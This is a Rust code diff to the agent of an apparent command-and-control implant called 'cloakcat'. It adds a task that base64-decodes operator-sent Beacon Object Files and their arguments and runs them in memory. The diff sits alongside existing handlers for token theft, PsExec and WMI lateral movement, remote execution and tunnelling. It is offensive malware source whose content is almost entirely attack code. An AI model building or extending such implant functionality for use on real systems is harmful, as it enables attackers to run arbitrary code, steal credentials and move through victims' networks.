@@ -11,10 +11,11 @@ use std::env;
 use std::time::Duration;
 
 use anyhow::Context;
+use base64::Engine;
 use cloakcat_protocol::{
-    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, JumpPsexecTask,
-    JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask, ResultReq, StealTokenTask,
-    TaskType, TunnelAction, UploadTask,
+    profile_by_name, sign_result, BofTask, Command, DerivedKeys, DownloadTask, Endpoints,
+    JumpPsexecTask, JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask, ResultReq,
+    StealTokenTask, TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -117,6 +118,21 @@ async fn dispatch_task<T: Transport>(
             let task: RemoteExecTask = serde_json::from_str(&cmd.command)
                 .context("bad RemoteExecTask payload")?;
             tasks::lateral::remote_exec(&task.method, &task.target, &task.command)
+        }
+        TaskType::Bof => {
+            let task: BofTask = serde_json::from_str(&cmd.command)
+                .context("bad BofTask payload")?;
+            let bof_bytes = base64::engine::general_purpose::STANDARD
+                .decode(&task.bof_b64)
+                .context("bad BOF base64")?;
+            let args_bytes = if task.args_b64.is_empty() {
+                Vec::new()
+            } else {
+                base64::engine::general_purpose::STANDARD
+                    .decode(&task.args_b64)
+                    .context("bad BOF args base64")?
+            };
+            crate::bof::execute_bof(&bof_bytes, &args_bytes).await
         }
     }
 }
